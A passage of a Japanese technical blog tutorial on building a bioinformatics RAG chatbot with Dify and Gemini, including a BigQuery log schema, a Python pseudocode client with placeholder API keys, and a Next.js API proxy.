Labの未知生命データ解析報告もこの方式で管理可能です。</p>\n<h3 data-sourcepos=\"37:1-37:23\">\n<span id=\"gemini-llmの特徴\" class=\"fragment\"></span><a href=\"#gemini-llm%E3%81%AE%E7%89%B9%E5%BE%B4\"><i class=\"fa fa-link\"></i></a>Gemini LLMの特徴</h3>\n<p data-sourcepos=\"38:1-38:251\">Google Cloud Vertex AIで提供されるGemini LLMは、膨大な科学論文や技術データを学習した強力な大規模言語モデルです。検索した文書チャンクを入力に文脈を理解し、自然な回答を生成します。</p>\n<h3 data-sourcepos=\"40:1-40:22\">\n<span id=\"ragの技術背景\" class=\"fragment\"></span><a href=\"#rag%E3%81%AE%E6%8A%80%E8%A1%93%E8%83%8C%E6%99%AF\"><i class=\"fa fa-link\"></i></a>RAGの技術背景</h3>\n<p data-sourcepos=\"41:1-41:49\">RAGは大まかに2段階に分けられます：</p>\n<ol data-sourcepos=\"43:1-45:0\">\n<li data-sourcepos=\"43:1-43:129\">\n<strong>Retrieval（検索）</strong>：ユーザーの質問に関連する文書チャンクを埋め込みベクトル検索で特定</li>\n<li data-sourcepos=\"44:1-45:0\">\n<strong>Augmented Generation（拡張生成）</strong>：Gemini LLMに検索結果を与え、質問への回答を生成</li>\n</ol>\n<p data-sourcepos=\"46:1-46:141\">こうしてLLMの大量知識保持に加え、最新のローカル知見を活用できるハイブリッド設計が成り立ちます。</p>\n<p data-sourcepos=\"48:1-49:153\">（文章で図解イメージ案：<br>\n「質問入力 → ベクトル埋め込み → Dify検索 → 関連文書チャンク抽出 → Gemini LLMへ提供 → 自然言語回答生成」）</p>\n<hr data-sourcepos=\"51:1-52:0\">\n<h2 data-sourcepos=\"53:1-53:73\">\n<span id=\"-技術的な仕組みragとbigquery評価ログ基盤の詳細\" class=\"fragment\"></span><a href=\"#-%E6%8A%80%E8%A1%93%E7%9A%84%E3%81%AA%E4%BB%95%E7%B5%84%E3%81%BFrag%E3%81%A8bigquery%E8%A9%95%E4%BE%A1%E3%83%AD%E3%82%B0%E5%9F%BA%E7%9B%A4%E3%81%AE%E8%A9%B3%E7%B4%B0\"><i class=\"fa fa-link\"></i></a>🔧 技術的な仕組み：RAGとBigQuery評価ログ基盤の詳細</h2>\n<h3 data-sourcepos=\"55:1-55:67\">\n<span id=\"1-文章チャンクの再帰分割と重複チャンク戦略\" class=\"fragment\"></span><a href=\"#1-%E6%96%87%E7%AB%A0%E3%83%81%E3%83%A3%E3%83%B3%E3%82%AF%E3%81%AE%E5%86%8D%E5%B8%B0%E5%88%86%E5%89%B2%E3%81%A8%E9%87%8D%E8%A4%87%E3%83%81%E3%83%A3%E3%83%B3%E3%82%AF%E6%88%A6%E7%95%A5\"><i class=\"fa fa-link\"></i></a>1. 文章チャンクの再帰分割と重複チャンク戦略</h3>\n<p data-sourcepos=\"56:1-57:103\">長大な論文や報告を単純に分割すると、切れ目で意味があいまいになることがあります。再帰的な分割アルゴリズムで小単位に分割しつつ、前後のチャンクを重複させることで文脈を保持。<br>\nこの手法はDifyプラットフォーム上でGUI操作もしくはAPI経由で設定可能です。</p>\n<h3 data-sourcepos=\"59:1-59:37\">\n<span id=\"2-埋め込みベクトル検索\" class=\"fragment\"></span><a href=\"#2-%E5%9F%8B%E3%82%81%E8%BE%BC%E3%81%BF%E3%83%99%E3%82%AF%E3%83%88%E3%83%AB%E6%A4%9C%E7%B4%A2\"><i class=\"fa fa-link\"></i></a>2. 埋め込みベクトル検索</h3>\n<p data-sourcepos=\"60:1-60:227\">チャンク文書はBERT系埋め込みモデルでベクトル化され、検索時はcos類似度等で関連度スコアを算出。高速な類似度検索はANNアルゴリズム（HNSWなど）でスケールします。</p>\n<h3 data-sourcepos=\"62:1-62:48\">\n<span id=\"3-bigquery上の推論評価ログ管理\" class=\"fragment\"></span><a href=\"#3-bigquery%E4%B8%8A%E3%81%AE%E6%8E%A8%E8%AB%96%E8%A9%95%E4%BE%A1%E3%83%AD%E3%82%B0%E7%AE%A1%E7%90%86\"><i class=\"fa fa-link\"></i></a>3. BigQuery上の推論・評価ログ管理</h3>\n<p data-sourcepos=\"63:1-63:102\">GEM Labの膨大な推論データを扱うためBigQueryに下記テーブルを設計しました：</p>\n<ul data-sourcepos=\"65:1-68:0\">\n<li data-sourcepos=\"65:1-65:95\">\n<strong>InferenceLog</strong>：質問文、検索チャンクID、Gemini応答文、タイムスタンプ</li>\n<li data-sourcepos=\"66:1-66:94\">\n<strong>ResponseMetadata</strong>：Geminiの生成パラメータ（温度、最大トークン数等）</li>\n<li data-sourcepos=\"67:1-68:0\">\n<strong>UserFeedback</strong>：調査員からの評価スコアやコメント</li>\n</ul>\n<p data-sourcepos=\"69:1-69:129\">これらを結合分析し、対話性能の継続的改善と異常検知、性能モニタリングに活用しています。</p>\n<hr data-sourcepos=\"71:1-72:0\">\n<h2 data-sourcepos=\"73:1-73:102\">\n<span id=\"-実践編difyでのナレッジベース構築とpythonによる関連検索応答生成\" class=\"fragment\"></span><a href=\"#-%E5%AE%9F%E8%B7%B5%E7%B7%A8dify%E3%81%A7%E3%81%AE%E3%83%8A%E3%83%AC%E3%83%83%E3%82%B8%E3%83%99%E3%83%BC%E3%82%B9%E6%A7%8B%E7%AF%89%E3%81%A8python%E3%81%AB%E3%82%88%E3%82%8B%E9%96%A2%E9%80%A3%E6%A4%9C%E7%B4%A2%E5%BF%9C%E7%AD%94%E7%94%9F%E6%88%90\"><i class=\"fa fa-link\"></i></a>🧪 実践編：Difyでのナレッジベース構築とPythonによる関連検索＋応答生成</h2>\n<h3 data-sourcepos=\"75:1-75:84\">\n<span id=\"1-dify-guiでのテキストアップロードチャンク識別設定手順\" class=\"fragment\"></span><a href=\"#1-dify-gui%E3%81%A7%E3%81%AE%E3%83%86%E3%82%AD%E3%82%B9%E3%83%88%E3%82%A2%E3%83%83%E3%83%97%E3%83%AD%E3%83%BC%E3%83%89%E3%83%81%E3%83%A3%E3%83%B3%E3%82%AF%E8%AD%98%E5%88%A5%E8%A8%AD%E5%AE%9A%E6%89%8B%E9%A0%86\"><i class=\"fa fa-link\"></i></a>1. Dify GUIでのテキストアップロード・チャンク識別設定手順</h3>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"77:1-85:3\"><div class=\"highlight\"><pre><code><span class=\"c\"># Difyへログイン後の基本操作概要</span>\n<span class=\"c\"># 1. ナレッジベース作成 → [新規作成]クリック</span>\n<span class=\"c\"># 2. バイオ関連文書をPDF・テキストでアップロード</span>\n<span class=\"c\"># 3. チャンクサイズ（例：500トークン）とオーバーラップ率（例：20%）を設定</span>\n<span class=\"c\"># 4. 自動チャンク生成ボタン押下 → 分割処理実行開始</span>\n<span class=\"c\"># 5. 埋め込みベクトル生成&amp;インデックス作成の進捗を待つ</span>\n<span class=\"c\"># 6. 検索設定で類似度閾値や結果取得件数を調整</span>\n</code></pre></div></div>\n<blockquote data-sourcepos=\"87:1-87:119\">\n<p data-sourcepos=\"87:3-87:119\">GUIのため細部ステップは画面キャプチャ付きの公式ドキュメント参照がおすすめです。</p>\n</blockquote>\n<h3 data-sourcepos=\"89:1-89:80\">\n<span id=\"2-python擬似コードでの埋め込み検索とgemini-api呼び出し例\" class=\"fragment\"></span><a href=\"#2-python%E6%93%AC%E4%BC%BC%E3%82%B3%E3%83%BC%E3%83%89%E3%81%A7%E3%81%AE%E5%9F%8B%E3%82%81%E8%BE%BC%E3%81%BF%E6%A4%9C%E7%B4%A2%E3%81%A8gemini-api%E5%91%BC%E3%81%B3%E5%87%BA%E3%81%97%E4%BE%8B\"><i class=\"fa fa-link\"></i></a>2. Python擬似コードでの埋め込み検索とGemini API呼び出し例</h3>\n<div class=\"code-frame\" data-lang=\"python\" data-sourcepos=\"91:1-142:3\"><div class=\"highlight\"><pre><code><span class=\"kn\">import</span> <span class=\"n\">requests</span>\n<span class=\"kn\">import</span> <span class=\"n\">json</span>\n\n<span class=\"c1\"># DifyのAPIキーとGemini LLMエンドポイント\n</span><span class=\"n\">DIFY_API_URL</span> <span class=\"o\">=</span> <span class=\"sh\">\"</span><span class=\"s\">https://api.dify.ai/v1/search</span><span class=\"sh\">\"</span>\n<span class=\"n\">DIFY_API_KEY</span> <span class=\"o\">=</span> <span class=\"sh\">\"</span><span class=\"s\">your_dify_api_key</span><span class=\"sh\">\"</span>\n\n<span class=\"n\">GEMINI_API_URL</span> <span class=\"o\">=</span> <span class=\"sh\">\"</span><span class=\"s\">https://vertexai.googleapis.com/v1/projects/{project_id}/locations/{location}/models/{model}:predict</span><span class=\"sh\">\"</span>\n<span class=\"n\">GEMINI_API_KEY</span> <span class=\"o\">=</span> <span class=\"sh\">\"</span><span class=\"s\">your_gemini_api_key</span><span class=\"sh\">\"</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">search_chunks</span><span class=\"p\">(</span><span class=\"n\">question</span><span class=\"p\">:</span> <span class=\"nb\">str</span><span class=\"p\">):</span>\n    <span class=\"n\">headers</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n        <span class=\"sh\">\"</span><span class=\"s\">Authorization</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"s\">Bearer </span><span class=\"si\">{</span><span class=\"n\">DIFY_API_KEY</span><span class=\"si\">}</span><span class=\"sh\">\"</span><span class=\"p\">,</span>\n        <span class=\"sh\">\"</span><span class=\"s\">Content-Type</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"sh\">\"</span><span class=\"s\">application/json</span><span class=\"sh\">\"</span><span class=\"p\">,</span>\n    <span class=\"p\">}</span>\n    <span class=\"n\">payload</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n        <span class=\"sh\">\"</span><span class=\"s\">query</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"n\">question</span><span class=\"p\">,</span>\n        <span class=\"sh\">\"</span><span class=\"s\">top_k</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"mi\">5</span>\n    <span class=\"p\">}</span>\n    <span class=\"n\">response</span> <span class=\"o\">=</span> <span class=\"n\">requests</span><span class=\"p\">.</span><span class=\"nf\">post</span><span class=\"p\">(</span><span class=\"n\">DIFY_API_URL</span><span class=\"p\">,</span> <span class=\"n\">headers</span><span class=\"o\">=</span><span class=\"n\">headers</span><span class=\"p\">,</span> <span class=\"n\">json</span><span class=\"o\">=</span><span class=\"n\">payload</span><span class=\"p\">)</span>\n    <span class=\"n\">response</span><span class=\"p\">.</span><span class=\"nf\">raise_for_status</span><span class=\"p\">()</span>\n    <span class=\"k\">return</span> <span class=\"n\">response</span><span class=\"p\">.</span><span class=\"nf\">json</span><span class=\"p\">()</span>  <span class=\"c1\"># 検索チャンクの詳細リスト\n</span>\n<span class=\"k\">def</span> <span class=\"nf\">generate_answer</span><span class=\"p\">(</span><span class=\"n\">context_chunks</span><span class=\"p\">:</span> <span class=\"nb\">list</span><span class=\"p\">,</span> <span class=\"n\">question</span><span class=\"p\">:</span> <span class=\"nb\">str</span><span class=\"p\">):</span>\n    <span class=\"n\">prompt</span> <span class=\"o\">=</span> <span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"s\">以下の情報を参考に質問に回答してください：</span><span class=\"se\">\\n</span><span class=\"si\">{</span><span class=\"sh\">''</span><span class=\"p\">.</span><span class=\"nf\">join</span><span class=\"p\">([</span><span class=\"n\">c</span><span class=\"p\">[</span><span class=\"sh\">'</span><span class=\"s\">text</span><span class=\"sh\">'</span><span class=\"p\">]</span> <span class=\"k\">for</span> <span class=\"n\">c</span> <span class=\"ow\">in</span> <span class=\"n\">context_chunks</span><span class=\"p\">])</span><span class=\"si\">}</span><span class=\"se\">\\n</span><span class=\"s\">質問：</span><span class=\"si\">{</span><span class=\"n\">question</span><span class=\"si\">}</span><span class=\"se\">\\n</span><span class=\"s\">回答：</span><span class=\"sh\">\"</span>\n    <span class=\"n\">headers</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n        <span class=\"sh\">\"</span><span class=\"s\">Authorization</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"s\">Bearer </span><span class=\"si\">{</span><span class=\"n\">GEMINI_API_KEY</span><span class=\"si\">}</span><span class=\"sh\">\"</span><span class=\"p\">,</span>\n        <span class=\"sh\">\"</span><span class=\"s\">Content-Type</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"sh\">\"</span><span class=\"s\">application/json</span><span class=\"sh\">\"</span><span class=\"p\">,</span>\n    <span class=\"p\">}</span>\n    <span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n        <span class=\"sh\">\"</span><span class=\"s\">instances</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"p\">[{</span><span class=\"sh\">\"</span><span class=\"s\">content</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"n\">prompt</span><span class=\"p\">}],</span>\n        <span class=\"sh\">\"</span><span class=\"s\">parameters</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n            <span class=\"sh\">\"</span><span class=\"s\">temperature</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"mf\">0.3</span><span class=\"p\">,</span>\n            <span class=\"sh\">\"</span><span class=\"s\">maxOutputTokens</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"mi\">512</span>\n        <span class=\"p\">}</span>\n    <span class=\"p\">}</span>\n    <span class=\"n\">response</span> <span class=\"o\">=</span> <span class=\"n\">requests</span><span class=\"p\">.</span><span class=\"nf\">post</span><span class=\"p\">(</span><span class=\"n\">GEMINI_API_URL</span><span class=\"p\">,</span> <span class=\"n\">headers</span><span class=\"o\">=</span><span class=\"n\">headers</span><span class=\"p\">,</span> <span class=\"n\">json</span><span class=\"o\">=</span><span class=\"n\">data</span><span class=\"p\">)</span>\n    <span class=\"n\">response</span><span class=\"p\">.</span><span class=\"nf\">raise_for_status</span><span class=\"p\">()</span>\n    <span class=\"n\">pred</span> <span class=\"o\">=</span> <span class=\"n\">response</span><span class=\"p\">.</span><span class=\"nf\">json</span><span class=\"p\">()</span>\n    <span class=\"k\">return</span> <span class=\"n\">pred</span><span class=\"p\">[</span><span class=\"sh\">'</span><span class=\"s\">predictions</span><span class=\"sh\">'</span><span class=\"p\">][</span><span class=\"mi\">0</span><span class=\"p\">][</span><span class=\"sh\">'</span><span class=\"s\">content</span><span class=\"sh\">'</span><span class=\"p\">]</span>\n\n<span class=\"k\">if</span> <span class=\"n\">__name__</span> <span class=\"o\">==</span> <span class=\"sh\">\"</span><span class=\"s\">__main__</span><span class=\"sh\">\"</span><span class=\"p\">:</span>\n    <span class=\"n\">user_question</span> <span class=\"o\">=</span> <span class=\"sh\">\"</span><span class=\"s\">RNA-seqデータの正規化方法は何ですか？</span><span class=\"sh\">\"</span>\n    <span class=\"n\">search_result</span> <span class=\"o\">=</span> <span class=\"nf\">search_chunks</span><span class=\"p\">(</span><span class=\"n\">user_question</span><span class=\"p\">)</span>\n    <span class=\"n\">context</span> <span class=\"o\">=</span> <span class=\"n\">search_result</span><span class=\"p\">.</span><span class=\"nf\">get</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">results</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"p\">[])</span>\n    <span class=\"n\">answer</span> <span class=\"o\">=</span> <span class=\"nf\">generate_answer</span><span class=\"p\">(</span><span class=\"n\">context</span><span class=\"p\">,</span> <span class=\"n\">user_question</span><span class=\"p\">)</span>\n    <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">=== 質問 ===</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n    <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"n\">user_question</span><span class=\"p\">)</span>\n    <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">=== 回答 ===</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n    <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"n\">answer</span><span class=\"p\">)</span>\n</code></pre></div></div>\n<ul data-sourcepos=\"144:1-144:35\">\n<li data-sourcepos=\"144:1-144:35\"><strong>ディレクトリ構成例</strong></li>\n</ul>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"145:1-150:3\"><div class=\"highlight\"><pre><code>project-root/\n├── main.py             # 上記コード\n├── requirements.txt    # requestsやGCPクライアント記載\n└── README.md\n</code></pre></div></div>\n<ul data-sourcepos=\"152:1-152:20\">\n<li data-sourcepos=\"152:1-152:20\"><strong>依存関係</strong></li>\n</ul>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"153:1-155:3\"><div class=\"highlight\"><pre><code>requests==2.28.1\n</code></pre></div></div>\n<hr data-sourcepos=\"157:1-158:0\">\n<h2 data-sourcepos=\"159:1-159:92\">\n<span id=\"-応用発展実用例バイオデータ解析とnextjsによるui最適化\" class=\"fragment\"></span><a href=\"#-%E5%BF%9C%E7%94%A8%E7%99%BA%E5%B1%95%E5%AE%9F%E7%94%A8%E4%BE%8B%E3%83%90%E3%82%A4%E3%82%AA%E3%83%87%E3%83%BC%E3%82%BF%E8%A7%A3%E6%9E%90%E3%81%A8nextjs%E3%81%AB%E3%82%88%E3%82%8Bui%E6%9C%80%E9%81%A9%E5%8C%96\"><i class=\"fa fa-link\"></i></a>🚀 応用・発展・実用例：バイオデータ解析とNext.jsによるUI最適化</h2>\n<h3 data-sourcepos=\"161:1-161:55\">\n<span id=\"バイオインフォメティクスへの適用例\" class=\"fragment\"></span><a href=\"#%E3%83%90%E3%82%A4%E3%82%AA%E3%82%A4%E3%83%B3%E3%83%95%E3%82%A9%E3%83%A1%E3%83%86%E3%82%A3%E3%82%AF%E3%82%B9%E3%81%B8%E3%81%AE%E9%81%A9%E7%94%A8%E4%BE%8B\"><i class=\"fa fa-link\"></i></a>バイオインフォメティクスへの適用例</h3>\n<ul data-sourcepos=\"162:1-164:0\">\n<li data-sourcepos=\"162:1-162:176\">ゲノム・RNA-seq解析論文のRAG検索で、解析方法やパラメータの即時回答を実現。調査員は未知生命ゲノムの特徴把握に活用可能。</li>\n<li data-sourcepos=\"163:1-164:0\">BigQueryの推論・評価ログから、質問傾向やGemini応答品質を分析し継続的チューニング。</li>\n</ul>\n<h3 data-sourcepos=\"165:1-165:84\">\n<span id=\"bigqueryスキーマ設計例推論レスポンス評価テーブル\" class=\"fragment\"></span><a href=\"#bigquery%E3%82%B9%E3%82%AD%E3%83%BC%E3%83%9E%E8%A8%AD%E8%A8%88%E4%BE%8B%E6%8E%A8%E8%AB%96%E3%83%AC%E3%82%B9%E3%83%9D%E3%83%B3%E3%82%B9%E8%A9%95%E4%BE%A1%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB\"><i class=\"fa fa-link\"></i></a>BigQueryスキーマ設計例（推論・レスポンス・評価テーブル）</h3>\n<div class=\"code-frame\" data-lang=\"sql\" data-sourcepos=\"167:1-191:3\"><div class=\"highlight\"><pre><code><span class=\"k\">CREATE</span> <span class=\"k\">TABLE</span> <span class=\"n\">InferenceLog</span> <span class=\"p\">(</span>\n    <span class=\"n\">id</span> <span class=\"n\">STRING</span> <span class=\"k\">PRIMARY</span> <span class=\"k\">KEY</span><span class=\"p\">,</span>\n    <span class=\"n\">user_query</span> <span class=\"n\">STRING</span><span class=\"p\">,</span>\n    <span class=\"n\">retrieved_chunks</span> <span class=\"n\">ARRAY</span><span class=\"o\">&lt;</span><span class=\"n\">STRING</span><span class=\"o\">&gt;</span><span class=\"p\">,</span>\n    <span class=\"n\">gemini_response</span> <span class=\"n\">STRING</span><span class=\"p\">,</span>\n    <span class=\"nb\">timestamp</span> <span class=\"nb\">TIMESTAMP</span>\n<span class=\"p\">);</span>\n\n<span class=\"k\">CREATE</span> <span class=\"k\">TABLE</span> <span class=\"n\">ResponseMetadata</span> <span class=\"p\">(</span>\n    <span class=\"n\">inference_id</span> <span class=\"n\">STRING</span><span class=\"p\">,</span>\n    <span class=\"n\">temperature</span> <span class=\"n\">FLOAT64</span><span class=\"p\">,</span>\n    <span class=\"n\">max_tokens</span> <span class=\"n\">INT64</span><span class=\"p\">,</span>\n    <span class=\"n\">model_version</span> <span class=\"n\">STRING</span><span class=\"p\">,</span>\n    <span class=\"k\">FOREIGN</span> <span class=\"k\">KEY</span> <span class=\"p\">(</span><span class=\"n\">inference_id</span><span class=\"p\">)</span> <span class=\"k\">REFERENCES</span> <span class=\"n\">InferenceLog</span><span class=\"p\">(</span><span class=\"n\">id</span><span class=\"p\">)</span>\n<span class=\"p\">);</span>\n\n<span class=\"k\">CREATE</span> <span class=\"k\">TABLE</span> <span class=\"n\">UserFeedback</span> <span class=\"p\">(</span>\n    <span class=\"n\">inference_id</span> <span class=\"n\">STRING</span><span class=\"p\">,</span>\n    <span class=\"n\">feedback_score</span> <span class=\"n\">INT64</span><span class=\"p\">,</span> <span class=\"c1\">-- 1-5評価</span>\n    <span class=\"k\">comment</span> <span class=\"n\">STRING</span><span class=\"p\">,</span>\n    <span class=\"nb\">timestamp</span> <span class=\"nb\">TIMESTAMP</span><span class=\"p\">,</span>\n    <span class=\"k\">FOREIGN</span> <span class=\"k\">KEY</span> <span class=\"p\">(</span><span class=\"n\">inference_id</span><span class=\"p\">)</span> <span class=\"k\">REFERENCES</span> <span class=\"n\">InferenceLog</span><span class=\"p\">(</span><span class=\"n\">id</span><span class=\"p\">)</span>\n<span class=\"p\">);</span>\n</code></pre></div></div>\n<h3 data-sourcepos=\"193:1-193:65\">\n<span id=\"nextjs-proxytsでのプリフェッチ制御コード抜粋\" class=\"fragment\"></span><a href=\"#nextjs-proxyts%E3%81%A7%E3%81%AE%E3%83%97%E3%83%AA%E3%83%95%E3%82%A7%E3%83%83%E3%83%81%E5%88%B6%E5%BE%A1%E3%82%B3%E3%83%BC%E3%83%89%E6%8A%9C%E7%B2%8B\"><i class=\"fa fa-link\"></i></a>Next.js proxy.tsでのプリフェッチ制御コード抜粋</h3>\n<div class=\"code-frame\" data-lang=\"typescript\" data-sourcepos=\"195:1-225:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// proxy.ts: Next.js API routeでGemini API呼び出し簡略化かつプリフェッチ無効化設定</span>\n<span class=\"k\">import</span> <span class=\"kd\">type</span> <span class=\"p\">{</span> <span class=\"nx\">NextApiRequest</span><span class=\"p\">,</span> <span class=\"nx\">NextApiResponse</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">'</span><span class=\"s1\">next</span><span class=\"dl\">'</span><span class=\"p\">;</span>\n\n<span class=\"k\">export</span> <span class=\"kd\">const</span> <span class=\"nx\">config</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n  <span class=\"na\">api</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n    <span class=\"na\">bodyParser</span><span class=\"p\">:</span> <span class=\"kc\">true</span><span class=\"p\">,</span>\n    <span class=\"na\">externalResolver</span><span class=\"p\">:</span> <span class=\"kc\">true</span><span class=\"p\">,</span>\n  <span class=\"p\">},</span>\n<span class=\"p\">};</span>\n\n<span class=\"k\">export</span> <span class=\"k\">default</span> <span class=\"k\">async</span> <span class=\"kd\">function</span> <span class=\"nf\">handler</span><span class=\"p\">(</span><span class=\"nx\">req</span><span class=\"p\">:</span> <span class=\"nx\">NextApiRequest</span><span class=\"p\">,</span> <span class=\"nx\">res</span><span class=\"p\">:</span> <span class=\"nx\">NextApiResponse</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"c1\">// プリフェッチ制御：GETメソッド時の過剰呼出し防止</span>\n  <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">req</span><span class=\"p\">.</span><span class=\"nx\">method</span> <span class=\"o\">===</span> <span class=\"dl\">'</span><span class=\"s1\">GET</span><span class=\"dl\">'</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nx\">req</span><span class=\"p\">.</span><span class=\"nx\">headers</span><span class=\"p\">[</span><span class=\"dl\">'</span><span class=\"s1\">x-nextjs-data-prefetch</span><span class=\"dl\">'</span><span class=\"p\">]</span> <span class=\"o\">===</span> <span class=\"dl\">'</span><span class=\"s1\">1</span><span class=\"dl\">'</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">return</span> <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nf\">status</span><span class=\"p\">(</span><span class=\"mi\">204</span><span class=\"p\">).</span><span class=\"nf\">end</span><span class=\"p\">();</span>\n  <span class=\"p\">}</span>\n  \n  <span class=\"c1\">// Gemini API呼び出し処理をここに記述</span>\n  <span class=\"c1\">// 例: fetchでPOST送信し結果を返す</span>\n  <span class=\"kd\">const</span> <span class=\"nx\">response</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nf\">fetch</span><span class=\"p\">(</span><span class=\"nx\">process</span><span class=\"p\">.</span><span class=\"nx\">env</span><span class=\"p\">.</span><span class=\"nx\">GEMINI_API_ENDPOINT</span><span class=\"o\">!</span><span class=\"p\">,</span> <span class=\"p\">{</span>\n    <span class=\"na\">method</span><span class=\"p\">:</span> <span class=\"dl\">'</span><span class=\"s1\">POST</span><span class=\"dl\">'</span><span class=\"p\">,</span>\n    <span class=\"na\">headers</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n      <span class=\"dl\">'</span><span class=\"s1\">Content-Type</span><span class=\"dl\">'</span><span class=\"p\">:</span> <span class=\"dl\">'</span><span class=\"s1\">application/json</span><span class=\"dl\">'</span><span class=\"p\">,</span>\n      <span class=\"dl\">'</span><span class=\"s1\">Authorization</span><span class=\"dl\">'</span><span class=\"p\">:</span> <span class=\"s2\">`Bearer </span><span class=\"p\">${</span><span class=\"nx\">process</span><span class=\"p\">.</span><span class=\"nx\">env</span><span class=\"p\">.</span><span class=\"nx\">GEMINI_API_KEY</span><span class=\"p\">}</span><span class=\"s2\">`</span><span class=\"p\">,</span>\n    <span class=\"p\">},</span>\n    <span class=\"na\">body</span><span class=\"p\">:</span> <span class=\"nx\">JSON</span><span class=\"p\">.</span><span class=\"nf\">stringify</span><span class=\"p\">(</span><span class=\"nx\">req</span><span class=\"p\">.</span><span class=\"nx\">body</span><span class=\"p\">),</span>\n  <span class=\"p\">});</span>\n  <span class=\"kd\">const</span> <span class=\"nx\">data</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nx\">response</span><span class=\"p\">.</span><span class=\"nf\">json</span><span class=\"p\">();</span>\n  <span class=\"nx\">res</span><span class=\"p\">.</span><span class=\"nf\">status</span><span class=\"p\">(</span><span class=\"nx\">response</span><span class=\"p\">.</span><span class=\"nx\">status</span><span class=\"p\">).</span><span class=\"nf\">json</span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<hr data-sourcepos=\"227:1-228:0\">\n<h2 data-sourcepos=\"229:1-229:32\">\n<span id=\"-まとめtakeaways\" class=\"fragment\"></span><a href=\"#-%E3%81%BE%E3%81%A8%E3%82%81takeaways\"><i class=\"fa fa-link\"></i></a>📝 まとめ（Takeaways）</h2>\n<ul data-sourcepos=\"231:1-236:0\">\n<li data-sourcepos=\"231:1-231:156\">DifyとGemini LLMの連携で、バイオインフォマティクス領域の専門知識を活用したRAGチャットボットを手軽に構築可能</li>\n<li data-sourcepos=\"232:1-232:112\">文章チャンクの再帰分割・重複戦略と埋め込み検索により高度な文脈理解を実現</li>\n<li data-sourcepos=\"233:1-233:93\">BigQueryを用いた推論・評価ログ管理は継続的品質改善の基盤となる</li>\n<li data-sourcepos=\"234:1-234:91\">Next.jsのAPIルートを活用したWebUI最適化でユーザー体験向上が可能</li>\n<li data-sourcepos=\"235:1-236:0\">GEM Labの調査環境で得られた知見は将来的な未知生命の迅速解析・意思決定を後押しする</li>\n</ul>\n<hr data-sourcepos=\"237:1-238:0\">\n<h2 data-sourcepos=\"239:1-239:10\">\n<span id=\"-faq\" class=\"fragment\"></span><a href=\"#-faq\"><i class=\"fa fa-link\"></i></a>❓ FAQ</h2>\n<p data-sourcepos=\"241:1-241:59\"><strong>Q1: Gemini LLMを使う際に注意すべき点は？</strong></p>\n<ul data-sourcepos=\"242:1-244:0\">\n<li data-sourcepos=\"242:1-242:100\">セキュリティトークン管理を厳重にし、不正利用を防止してください。</li>\n<li data-sourcepos=\"243:1-244:0\">モデルの応答生成パラメータはケースに応じて調整し、無用な長文生成を避けることが重要です。</li>\n</ul>\n<p data-sourcepos=\"245:1-245:86\"><strong>Q2: Difyノーコードプラットフォームの無料プランで制限は？</strong></p>\n<ul data-sourcepos=\"246:1-247:0\">\n<li data-sourcepos=\"246:1-247:0\">一部機能制限や同時利用リクエスト数制限があります。大規模運用時は有料プラン検討を推奨します。</li>\n</ul>\n<p data-sourcepos=\"248:1-248:51\"><strong>Q3: BigQueryの料金を抑える工夫は？</strong></p>\n<ul data-sourcepos=\"249:1-250:0\">\n<li data-sourcepos=\"249:1-250:0\">ログは必要最小限に絞り、パーティショニングやクラスタリングを活用してクエリコスト低減を図ります。</li>\n</ul>\n<p data-sourcepos=\"251:1-251:61\"><strong>Q4: 他言語やフレームワークでの応用は？</strong></p>\n<ul data-sourcepos=\"252:1-253:0\">\n<li data-sourcepos=\"252:1-253:0\">REST APIベースなので、Python以外にNode.jsやGoなど任意言語からの連携が可能です。</li>\n</ul>\n<hr data-sourcepos=\"254:1-255:0\">\n<h2 data-sourcepos=\"256:1-256:35\">\n<span id=\"-参考文献リンク集\" class=\"fragment\"></span><a 